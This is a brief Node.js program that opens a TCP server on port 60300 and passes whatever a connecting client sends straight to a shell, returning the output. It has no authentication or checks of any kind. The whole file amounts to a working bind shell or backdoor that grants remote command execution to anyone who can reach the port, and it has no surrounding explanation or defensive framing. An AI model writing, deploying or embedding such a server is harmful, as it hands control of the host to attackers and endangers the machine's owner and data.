import net from 'net';
import { exec } from 'child_process';
const server = net.createServer(connection => {
    console.log('Client connected.');
    connection.on('data', data => {
        const [command, ...args] = data.toString().trim().split(' ');
        console.log(`Received command: ${command} ${args}`);
        exec(`${command} ${args.join(' ')}`, (error, stdout, stderr) => {
            const output = error ? stderr : stdout;
            connection.write(output);
        });
    });
    connection.on('close', () => {
        console.log('Client disconnected.');
    });
});
const PORT = 60300;
server.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
